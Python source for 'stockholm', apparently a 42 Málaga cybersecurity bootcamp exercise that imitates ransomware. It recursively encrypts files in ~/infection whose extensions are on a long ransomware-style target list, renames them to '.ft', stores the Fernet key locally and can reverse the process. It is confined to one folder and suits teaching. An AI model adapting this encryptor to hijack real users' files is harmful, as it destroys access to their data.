import argparse
import os

from cryptography.fernet import Fernet
from pathlib import Path


# PROBLEMA:
# Crear un programa llamado 'stockholm' capaz de cifrar y descifrar ficheros.
# -r <clave>: revierte la infección usando la clave de cifrado.
# -v: muestra la versión del programa.
# -s: desactiva la información mostrada por pantalla.
# Si no se especifica ninguna opción, el programa cifra todos los ficheros de la carpeta del script.


# ----------------------------------------------------------------------------------------------------------------------


# Variables globales (y sus valores por defecto).
infectorio = str(Path.home()) + "/infection"    # 'Infectado' + 'Directorio'
ver_sem = "stockholm 0.4"
extensiones = ['.123', '.3dm', '.3ds', '.3g2', '.3gp', '.602', '.7z', '.ARC', '.PAQ', '.accdb', '.aes', '.ai', '.asc',
               '.asf', '.asm', '.asp', '.avi', '.backup', '.bak', '.bat', '.bmp', '.brd', '.bz2', '.c', '.cgm',
               '.class', '.cmd', '.cpp', '.crt', '.cs', '.csv', '.db', '.dbf', '.dch', '.der', '.dif', '.dip', '.djvu',
               '.doc', '.docb', '.docm', '.docx', '.dot', '.dotm', '.dotx', '.dwg', '.edb', '.eml', '.fla', '.flv',
               '.frm', '.gif', '.gpg', '.gz', '.h', '.hwp', '.ibd', '.iso', '.jar', '.java', '.jpeg', '.jpg', '.js',
               '.jsp', '.lay', '.lay6', '.ldf', '.m3u', '.m4u', '.max', '.mdb', '.mdf', '.mid', '.mkv', '.mml', '.mov',
               '.mp3', '.mp4', '.mpeg', '.mpg', '.msg', '.myd', '.myi', '.nef', '.odb', '.odg', '.odp', '.ods', '.odt',
               '.onetoc2', '.ost', '.otg', '.otp', '.ots', '.ott', '.pas', '.pdf', '.pem', '.pfx', '.php', '.pl',
               '.png', '.pot', '.potm', '.potx', '.ppam', '.pps', '.ppsm', '.ppsx', '.ppt', '.pptm', '.pptx', '.ps1',
               '.psd', '.pst', '.rar', '.raw', '.rb', '.rtf', '.sch', '.sh', '.sldm', '.sldx', '.slk', '.sln', '.snt',
               '.sql', '.sqlite3', '.sqlitedb', '.stc', '.std', '.sti', '.suo', '.svg', '.swf', '.sxc', '.sxd', '.sxi',
               '.sxm', '.sxw', '.tar', '.tbk', '.tgz', '.tif', '.tiff', '.txt', '.uop', '.uot', '.vb', '.vbs', '.vcd',
               '.vdi', '.vmdk', '.vmx', '.vob', '.vsd', '.vsdx', '.wav', '.wb2', '.wk1', '.wks', '.wma', '.wmv', '.xlc',
               '.xlm', '.xls', '.xlsb', '.xlsm', '.xlsx', '.xlt', '.xltm', '.xltx', '.xlw', '.zip', 'csr', 'p12']


# Leer los argumentos de entrada de la línea de comandos.
def leer_argumentos():
    # Inicializar el analizador de argumentos.
    analizador = inicializar_analizador()

    return analizador.r, analizador.v, analizador.s, analizador.p


# Inicializar el parser de la línea de comandos.
def inicializar_analizador():
    # Analizador de argumentos de la línea de comandos.
    analizador = argparse.ArgumentParser(
        # prog="./stockholm",
        description="Herramienta casera para 'secuestrar' y 'liberar' ficheros.",
        epilog="Ejercicio 'stockholm' del Bootcamp de Ciberseguridad de la Fundación 42 (Málaga).",
    )

    # Agregar las opciones del comando.
    analizador.add_argument(
        "-r",
        metavar="clave",
        help="revierte la infección usando la clave de cifrado.",
        type=str)
    analizador.add_argument(
        "-v",
        help="versión del programa.",
        action="store_true")
    analizador.add_argument(
        "-s",
        help="desactiva la información mostrada por pantalla.",
        action="store_true")
    analizador.add_argument(
        "-p",
        metavar="carpeta",
        help="descifra todos los ficheros y los almacena en la carpeta indicada.")

    # Obtener los argumentos de la línea de comandos.
    return analizador.parse_args()


# Comprueba que un fichero tiene alguna de las extensiones indicadas.
def validar_fichero(elemento, modo):
    # El objeto es un fichero, pero ninguno 'importante'.
    if os.path.isfile(elemento) and elemento not in ["stockholm.py", "clave.key"]:

        # Comprobar validez respecto al cifrado (extensiones compatibles).
        if modo == "c":
            # Comprobar la extensión.
            for extension in extensiones:
                if elemento.endswith(extension):
                    return True

        # Comprobar validez respecto al descifrado (extensión es ' .ft').
        elif modo == "d":
            # Comprobar la extensión.
            if elemento.endswith(".ft"):
                return True

        else:
            if not silencio:
                print("Error: modo inexistente de validación de fichero.")
                print("Formatos aceptados: 'c' (cifrado) o 'd' (descifrado).")

            exit(1)

    return False


# Genera una lista con todos los ficheros de una carpeta, incluidos los de subcarpetas.
def contenido(carpeta):
    # Comprobar que la ruta es una carpeta.
    if os.path.isdir(carpeta):
        # Obtener la lista de ficheros.
        ficheros = os.listdir(carpeta)

        # Comprobar que la carpeta no esté vacía.
        if len(ficheros) > 0:
            # Inicializar la lista.
            lista = []

            # Recorrer la lista de ficheros.
            for fichero in ficheros:
                # Comprobar que el fichero sea una carpeta.
                if os.path.isdir(carpeta + "/" + fichero):
                    # Añadir los ficheros de la subcarpeta.
                    lista += contenido(carpeta + "/" + fichero)
                else:
                    # Añadir el fichero.
                    lista.append(carpeta + "/" + fichero)

            # Devolver la lista.
            return lista

        else:
            # Devolver una lista vacía.
            return []

    else:
        if not silencio:
            print("Error: la ruta indicada no es una carpeta.")

        exit(1)


# Cifra los archivos del directorio de este script que tenga alguna de las extensiones indicadas.
# Una vez cifrados les añade la extensión '.ft' y los guarda en un directorio llamado 'infection'.
def secuestrar():
    ficheros = []   # Ficheros a cifrar
    exito = 0       # Ficheros cifrados

    # Obtener todos los elementos en el directorio de este script.
    for fichero in contenido(infectorio):
        # Comprobar la validez del fichero para su cifrado.
        if validar_fichero(fichero, "c"):
            ficheros.append(fichero)

    # Generar una clave de cifrado.
    clave = Fernet.generate_key()   # Clave de más de 16 caracteres.

    # Escribir la clave en un fichero.
    with open("clave.key", "wb") as f:
        f.write(clave)

    # Mostrar mensaje si hay ficheros para cifrar.
    if not silencio and ficheros:
        print("Cifrando archivos:")

    # Cifrar los ficheros obtenidos anteriormente.
    for fichero in ficheros:
        if not silencio:
            print("\t{}".format(fichero))

        try:
            # Extraer y cifrar el contenido del fichero.
            with open(fichero, "rb") as f:
                cifrado = Fernet(clave).encrypt(f.read())

            # Escribir el contenido cifrado del fichero.
            with open(fichero, "wb") as f:
                f.write(cifrado)

            # Renombrar el fichero añadiendo la extensión.
            os.rename(fichero, fichero + ".ft")

            # Contar el número de ficheros cifrados.
            exito += 1

        except Exception as e:
            if not silencio:
                print("Error: no se pudo cifrar el fichero '{}'.".format(fichero))

    # Mostrar el resumen (si 'ficheros = []' al menos muestra '0/0').
    if not silencio:
        print("\nArchivos cifrados:")

        for f in sorted(ficheros):
            print("\t{}".format(f))

        print("\n\tResumen: {0}/{1} ficheros descifrados.".format(exito, len(ficheros)))

    # Devuelve la cantidad de ficheros cifrados (no se usa).
    return len(ficheros)


# Descifrar los archivos del directorio de este script que tengan
# la extensión '.ft', salvo que su extensión original ya fuera '.ft'.
def liberar(carpeta):
    ficheros = []   # Ficheros a descifrar
    exito = 0       # Ficheros descifrados

    # Obtener todos los elementos en el directorio de este script.
    for elemento in contenido(infectorio):
        # Comprobar la validez del elemento para su descifrado.
        if validar_fichero(elemento, "d"):
            ficheros.append(elemento)

    # Mostrar los ficheros cifrados.
    if not silencio and ficheros:
        print("Archivos cifrados:")

        for f in sorted(ficheros):
            print("\t{}".format(f))

        print("\n\tTotal: {}.\n".format(len(ficheros)))


    # Leer la clave de cifrado.
    with open("clave.key", "rb") as f:
        clave = f.read()

    # Descifrar los ficheros obtenidos anteriormente.
    for fichero in ficheros:
        # Extraer el nombre del fichero de su ruta.
        nombre = os.path.split(fichero)[1]

        """
        '[1]' porque devuelve una tupla '(path, file)' y solo quiero el nombre.
        """

        try:
            # Extraer y descifrar el contenido del fichero.
            with open(fichero, "rb") as f:
                descifrado = Fernet(clave).decrypt(f.read())

            # Escribir el contenido descifrado del fichero.
            with open(fichero, "wb") as f:
                f.write(descifrado)

            # Mover el fichero a la carpeta, si se indicó una.
            if carpeta:
                # Crear la carpeta si no existe.
                if not os.path.exists(carpeta):
                    os.makedirs(carpeta)

                # Renombrar el fichero cifrado
                os.rename(fichero, carpeta + "/" + nombre[:-3])

            else:
                # Renombrar el dichero cifrado
                os.rename(fichero, fichero[:-3])

            # Contar el número de ficheros descifrados.
            exito += 1

            """
            '[:-3]' para el devolver el nombre hasta el '.ft' que mide 3 caracteres.
            """

        # Un fichero es '.ft' sin extensión original o el descifrado falla.
        except Exception:
            if not silencio:
                print("Error: no se pudo descifrar el fichero '{}'.".format(nombre))

    # Mostrar el resumen (si 'ficheros = []' al menos muestra '0/0').
    if not silencio:
        print("\nArchivos descifrados:")

        for f in sorted(ficheros):
            print("\t{}".format(f))

        print("\n\tResumen: {0}/{1} ficheros descifrados.".format(exito, len(ficheros)))

    # Devuelve la cantidad de ficheros descifrados (no se usa).
    return len(ficheros)


# ----------------------------------------------------------------------------------------------------------------------


if __name__ == "__main__":
    # Leer los argumentos de entrada de la línea de comandos.
    revertir, version, silencio, carpeta = leer_argumentos()

    # Se solicitó la versión del programa (-v).
    if version:
        print("Versión:", ver_sem)

    # Se solicitó descifrar los ficheros (-r).
    elif revertir:
        # Verificar que existe la clave.
        if os.path.exists("clave.key"):
           liberar(carpeta)    # Se solicitó una 'carpeta' donde descifrar (-p).

        else:
            if not silencio:
                print("Error GRAVE: no se encontró el fichero 'clave.key'.")

    # Se solicitó cifrar los ficheros (ninguna opción).
    else:
        # Verificar que existe la carpeta por defecto.
        if os.path.exists(infectorio):
            secuestrar()

        elif not silencio:
            print("Error: no existe la carpeta '{}'.".format(infectorio))

        """
        Decido no crear la carpeta si no existe, porque debe contener ficheros.
        """
